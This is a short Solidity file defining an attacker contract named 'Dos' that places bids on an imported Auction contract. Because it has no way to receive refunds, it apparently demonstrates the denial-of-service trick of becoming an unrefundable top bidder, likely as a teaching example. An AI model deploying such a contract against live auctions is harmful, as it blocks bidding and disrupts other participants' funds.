// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.34;

import "./Auction.sol";

contract Dos {

    Auction private _auction;

    constructor(address auctionAddress) {
        _auction = Auction(auctionAddress);
    }

    function bid() external payable {
        _auction.bid{value: msg.value}();
    }
}